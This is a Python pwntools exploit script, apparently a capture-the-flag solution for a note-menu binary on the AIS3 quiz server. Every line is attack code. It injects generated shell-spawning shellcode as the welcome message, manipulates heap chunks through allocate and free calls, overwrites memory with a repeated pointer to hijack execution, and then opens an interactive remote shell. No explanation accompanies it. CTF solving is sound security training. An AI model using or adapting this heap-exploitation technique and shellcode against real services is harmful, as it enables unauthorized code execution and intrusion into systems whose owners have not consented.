from pwn import *

context.arch = 'i386'
context.os = 'linux'

p_info = 0x0804A0E0

io = remote('quiz.ais3.org', 5071)

io.recvuntil('Welcome, please leave some message for me:')
io.sendline(asm(shellcraft.sh()))

def menu(i):
    io.recvuntil('Your choice :')
    io.sendline(str(i))

def add_stu():
    menu(1)
    io.sendline('0')
    io.sendline('inndy')

def add_note(sz, data):
    menu(3)
    io.recvuntil('Size:')
    io.sendline(str(sz))
    io.recvuntil('Content:')
    io.sendline(data)

def del_note(index):
    menu(5)
    io.recvuntil('index:')
    io.sendline(str(index))

add_note(32, 'aa ')
add_note(20, 'aa ')
del_note(0)
del_note(1)
add_stu()
add_note(32, p32(p_info) * ((32+20+16) >> 2))
menu(2)

io.interactive()
